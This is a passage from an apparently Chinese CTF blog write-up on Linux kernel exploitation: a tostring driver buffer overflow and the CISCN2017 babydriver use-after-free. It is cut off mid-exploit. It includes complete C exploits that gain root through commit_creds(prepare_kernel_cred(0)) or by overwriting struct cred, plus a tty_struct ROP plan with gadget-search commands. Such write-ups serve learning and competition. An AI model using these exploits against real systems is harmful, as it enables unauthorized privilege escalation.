-f</span><br></pre></td></tr></table></figure><p>在tostring模块中可以发现，tostring结构中<code>tostring_stack</code>存在溢出的可能，在<code>tostring_write</code>中并未作出限制。<code>tostring_stack</code>后面就是一个函数指针。同时该kernel并没有随机化，通过<code>/proc/kallsyms</code>获取<code>prepare_kernel_cred</code>和<code>commit_creds</code>函数的地址。</p><p>调试中可以用条件断点<code>b tostring_write if (int)tostring==64</code>比较方便。</p><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/LinKern_x86-Buffer_overflow_basic_1/exp.c">exp</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;pushl %cs;popl tf+4;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfl;popl tf+8;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushl %esp;popl tf+12;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushl %ss;popl tf+16;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    tf.eip = &amp;getshell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xc10711f0</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xc1070e80</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov $tf, %esp;&quot;</span></span><br><span class="line">        <span class="string">&quot;iret;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> recv[<span class="number">255</span>];</span><br><span class="line">    <span class="keyword">char</span> padding[<span class="number">9</span>] = <span class="string">&quot;AAAAAAAA&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> eip[<span class="number">5</span>];</span><br><span class="line">    init_tf_work();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/tostring&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; ++i) &#123;</span><br><span class="line">        write(fd, padding, <span class="keyword">sizeof</span>(padding)<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *((<span class="keyword">void</span>**)(eip)) = &amp;payload;</span><br><span class="line">    write(fd, eip, <span class="keyword">sizeof</span>(eip)<span class="number">-1</span>);</span><br><span class="line">    read(fd, recv, <span class="number">255</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="UAF-amp-ROP-CISCN2017-babydriver"><a href="#UAF-amp-ROP-CISCN2017-babydriver" class="headerlink" title="UAF &amp; ROP | CISCN2017 babydriver"></a>UAF &amp; ROP | CISCN2017 babydriver</h3><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br></pre></td></tr></table></figure><p>第一个参数是文件描述符，第二个是程序对设备的控制指令，后面则是指令的补充参数。</p><p>对于Linux，一切皆文件。而Linux提供的读写文件的函数（read, write, lseek等）对于许多的设备不好进行控制，所以提供了ioctl函数。request就是设备驱动程序提供的控制指令。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><code>babydriver_init</code>，<code>babydriver_exit</code>是常规的创建和销毁过程。</p><p><code>babyioctl</code>定义了一个ioctl指令来分配指定大小的buf。</p><p><code>babyopen</code>默认分配一个64字节的buf。<code>kmem_cache_alloc_trace</code>似乎是<code>kmalloc</code>优化的结果，还不了解后续再研究。<a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/slab.h#L458">src</a></p><p><code>babyread</code>/<code>babywrite</code> 从buf读取数据/往buf写入数据，都对大小进行了验证，不存在溢出。</p><p>漏洞点在于该符号设备全局共享一个buf，所以同时打开两次，这两次共享一个buf，释放其中一个就发生了UAF。</p><h4 id="exploit1"><a href="#exploit1" class="headerlink" title="exploit1"></a>exploit1</h4><p>打开两次设备，使用ioctl控制buf为<code>struct cred</code>的大小，然后close其中一次打开，另一次打开就指向了一块已经释放的区域，fork产生的新进程就会分配得到该区块用来存储<code>cred</code>，通过另一次打开的设备进行覆写改变进程uid、gid，就获得了root权限。</p><p>在这里计算<code>struct cred</code>的大小是一个难点，我并未找到很简单的方法来计算。因为这个结构体里面也有许多的结构体，我觉得直接看源码并不那么容易计算。。。一层套一层，还有对齐的问题。先直接用了，后面再找办法[todolist2]，大小为0xa8。<a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118">src</a></p><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp1.c">exp</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> zero[<span class="number">36</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zero, <span class="keyword">sizeof</span>(zero));</span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)  &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fork failed!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="exploit2"><a href="#exploit2" class="headerlink" title="exploit2"></a>exploit2</h4><p>思路：利用gadgets关闭SMEP，内核没有开启地址随机，直接<code>commit_creds(prepare_kernel_cred(0))</code>，然后跳转到用户程序getshell。</p><p>这里使用覆写<code>tty_struct</code>的方法来获得程序控制流：</p><p><code>tty_struct</code></p><details>    <summary>struct tty_struct</summary>    <p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span>     &lt; -- 这里</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>    </p></details><p><code>struct tty_operations</code></p><details>    <summary>struct tty_operations</summary>    <p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>    </p></details><p>可以看到<code>tty_struct</code>结构偏移24的地方存放了一个<code>tty_operations</code>结构的指针，这个<code>tty_operations</code>结构都是对tty进行操作的函数指针，可以控制<code>ops</code>指针指向我们可以控制的区域。显然一次函数调用，我们能干的事情很少，所以就使用这一次调用执行stack pivot，ROP来获得持续的控制。</p><p>这里使用write函数调用，在执行到write时，可以发现此时rax指向<code>tty_operations</code>的首地址，所以先在operations中构造rop。（在V1NKe师傅的<a href="https://xz.aliyun.com/t/4529#toc-4">文章</a>中可以发现write是通过<code>call [rax+0x38]</code>调用的。如果一开始，应该怎样找到这个断点地址？[todolist1]）</p><p>使用<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>脚本解压得到内核镜像，再通过ROPgadget或者Ropper获得gadgets。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./extract-vmlinux bzImage &gt; vmlinux</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary vmlinux &gt; gadgets</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary vmlinux --opcode 48cf  <span class="comment"># search for iretq</span></span></span><br></pre></td></tr></table></figure><p>利用流程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 两次打开&#x2F;dev&#x2F;babydev设备，ioctl该设备buf为0x2e0   # sizeof(struct tty_struct) &#x3D; 0x2e0</span><br><span class="line">2. 在tty_operations上布置rop</span><br><span class="line">3. 关闭一个babydev，会将buf释放一次，造成UAF</span><br><span class="line">4. open(&quot;&#x2F;dev&#x2F;ptmx&quot;, O_RDWR|O_NOCTTY)将使用刚释放的0x2e0空间存储tty_struct</span><br><span class="line">5. 改写tty_struct</span><br><span class="line">6. write触发</span><br></pre></td></tr></table></figure><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp2.c">exp</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> rflags;</span><br><span class="line">    <span class="keyword">uint64_t</span> rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> ss;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span 